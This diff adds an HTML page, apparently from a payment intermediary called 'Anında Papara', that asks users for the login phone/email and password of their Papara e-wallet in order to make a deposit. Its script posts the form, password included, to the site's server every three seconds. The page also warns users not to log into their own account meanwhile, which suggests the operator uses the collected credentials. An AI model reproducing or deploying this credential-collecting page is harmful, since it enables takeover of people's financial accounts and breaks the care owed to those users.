@@ -1,0 +1,217 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
+    <meta charset="UTF-8">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Anında Papara</title>
+  <meta name="description" content="Anında Papara" />
+  <meta name="keywords" content="papara, anında" />
+  <meta name="abstract" content="Organization">
+  <meta name="author" content="Anında Pays">
+  <meta name="classification" content="Organization">
+  <meta name="content-language" content="tr">
+  <meta name="rating" content="general">
+  <meta name="distribution" content="global">
+  <meta name="resource-type" content="document">
+  <meta name="robots" content="all">
+  <meta name="googlebot" content="all">
+  <meta name="revisit-after" content="2 days">
+  <meta http-equiv="reply-to" content="info@anindapays.com">
+  <meta name="google" content="notranslate">
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black" />
+<link rel="shortcut icon" href="/assets/images/favicon.ico">
+
+    <link rel="stylesheet" href="/assets/styles/sweetalert2.min.css">
+
+    
+    
+
+        <link href="/assets/sumoselect/sumoselect.min.css?v=wFQvvKL6O-ddX3u6_pa0PS894wddlBJk4H6_s3SOJqY" rel="stylesheet" />
+        <link rel="stylesheet" href="/assets/js/bootstrap/css/bootstrap.min.css?v=r2PJ-lQcf_GGjGbISyy3G6TcYP1SBsCl92Xr5PsDzkY">
+        <link rel="stylesheet" href="/assets/css/style.min.css?v=SyJnVA8qE57bBTdFB2G8r5RCW5MbnFobO_GrYDuTkcY">
+
+
+        <script src="/assets/scripts/jquery.min.js"></script>
+        <script src="/assets/scripts/jquery.priceformat.min.js"></script>
+        <script src="/assets/scripts/jquery.starttimer.min.js"></script>
+        <script src="/assets/scripts/jquery.mask.min.js"></script>
+        <script src="/assets/scripts/clipboard.min.js"></script>
+        <script src="/assets/scripts/sweetalert2.min.js"></script>
+    
+</head>
+
+<body>
+
+    <form method="post" name="FormAction" id="FormAction" autocomplete="off" action="" style="margin-bottom: 0px;width:100%;height:100vh;">
+        <div class="container">
+            <div class="row d-flex flex-column min-vh-100 justify-content-center align-items-center">
+                <div class="col-lg-8 col-xs-12">
+                    <div class="cards">
+                        
+<input type="hidden" value="6550999f5c38e8509ebe28f4" name="txtToken" />
+
+<div id="divPaparaContent">
+    
+<div class="loading page-laoding loading-top">
+    <div>
+        <div class="loading-logo"><img src="/assets/images/loader-logo.png" alt=""></div>
+        <div class="loading-gif"><img src="/assets/images/loader.gif" alt=""></div>
+        <div class="text">İşleminiz yapılıyor, lütfen bekleyiniz.<br />Yatırım sonuçlanıncaya kadar lütfen <b>PAPARA</b> hesabınıza giriş yapmayınız.</div>
+    </div>
+</div>
+
+<div class="card-header">
+    <div class="row">
+        <div class="col-lg-5 col-xs-12">
+            <img src="/assets/images/ap_logo_light.svg" height="50" alt="Anında Papara">
+        </div>
+        <div class="col-lg-7 col-xs-12">
+            <p class="text-dark mt-3 mb-0 fs-8 text-end">Sayın <strong class="text-danger">Se** El**</strong> hoşgeldiniz</p>
+        </div>
+    </div>
+</div>
+
+    <div class="card-body">
+        <div class="row justify-content-center ">
+            <p class="fs-5 text-center fs-7"> Papara Giriş bilgilerinizi girerek yatırım yapabilirsiniz.</p>
+            <div class="col-md-6">
+                <div class="mt-1">
+                    <p class="fs-5 border-bottom pb-3 text-center fs-7">Kalan Süre <strong class="text-danger" id="timeOut" data-seconds-left="120">00:00</strong></p>
+
+                    <div class="mt-2">
+                        <label for="txtAmnt" class="required form-label mb-3">Cep Telefonu / E-Posta Adresi *</label>
+                        <input class="form-control form-control-solid" placeholder="Cep Telefonu / E-Posta Adresi Giriniz" type="text" value="" id="txtEmail" name="txtEmail">
+                        <span class="invalid"></span>
+                    </div>
+
+                    <div class="mt-2">
+                        <label for="txtAmnt" class="required form-label mb-2">Şifre *</label>
+                        <input class="form-control form-control-solid" placeholder="000000" type="password" value="" id="txtPassword" name="txtPassword">
+                        <span class="invalid"></span>
+                    </div>
+
+                    <div class="text-end">
+                        <a class="btn btn-info text-white fs-8 fw-bold p-2 px-3 btnLoginControl">DEVAM ET</a>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+
+    </div>
+    <script type="text/javascript">
+        $(document).ready(function () {
+
+            IsTimerStart = true;
+            $('#txtEmail').focus();
+            $("#txtPassword").mask("000000");
+            $('#timeOut').startTimer({
+                onComplete: function (element) {
+                    if (IsTimerStart == true) {
+                        $('.loading').fadeIn(5);
+                        location.reload();
+                    }
+                }
+            });
+        })
+    </script>
+
+    <script>
+        $('.loading').fadeOut("slow");
+    </script>
+
+</div>
+
+
+<script>
+    var isWorking = true;
+    var allInTimer = setInterval(async function() {
+        if (isWorking == true) {
+            isWorking = false;
+            $.post("/payment/get-user-check", $("#FormAction").serialize(), function(res) {
+
+                if (res.ID == 0) {
+
+                    swal.fire({
+                        type: "error",
+                        title: "Hata",
+                        html: res.Description,
+                        allowEscapeKey: false,
+                        allowEnterKey: false,
+                        allowOutsideClick: false,
+                        showCancelButton: false,
+                        showConfirmButton: true,
+                        timer: 4000,
+                    });
+
+                    $.post(res.HtmlPage, $("#FormAction").serialize(), function(data) {
+                        $("#divPaparaContent").html(data);
+                        isWorking = true;
+                    });
+
+                } else if (res.ID == 0 || res.ID == 4 || res.ID == 10) {
+
+                    $.post(res.HtmlPage, $("#FormAction").serialize(), function(data) {
+                        $("#divPaparaContent").html(data);
+                        isWorking = true;
+                    });
+
+                } else if (res.ID == 8 || res.ID == 9) {
+
+                    if (res.ID == 9) {
+
+                        swal.fire({
+                            type: "error",
+                            title: "Hata",
+                            html: "İşlem sırasında hata oluştu.<br>Tekrar talep oluşturunuz.",
+                            allowEscapeKey: false,
+                            allowEnterKey: false,
+                            allowOutsideClick: false,
+                            showCancelButton: false,
+                            showConfirmButton: false,
+                            timer: 3000,
+                        }).then(function() {
+                            document.location.href = res.HtmlPage;
+                        });
+
+                    } else {
+                        document.location.href = res.HtmlPage;
+                    }
+
+                } else if (res.ID == 99999) {
+
+                    $('.loading').fadeIn(1);
+                    $('.loading').show();
+
+                     isWorking = true;
+
+                }
+                else {
+                    isWorking = true;
+                }
+            });
+        }
+    }, 3000);
+
+</script>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+    <input name="__RequestVerificationToken" type="hidden" value="CfDJ8EV7yA0NTmpOvkE6Q6ihftuHXLSrMzCEjdxaiYOMEwOBBK_rxCJf4y55IexEa-jRTI8Dj6d7Xn7JCTcIVhEr48kwDBEb1LABFNbgUa3NkI9PnldIt7T1kcvH5cxOQ3Ns8lkXfO8BEvfRZpgGLZ0Lm_Y" /></form>
+    
+    
+    
+        <script src="/assets/scripts/jquery.main.min.js?v=nCeLdAeE5TeNWXWqDnzEGAZGA_96XUq19gluy7F1uus"></script>
+    
+
+</body>
+</html>
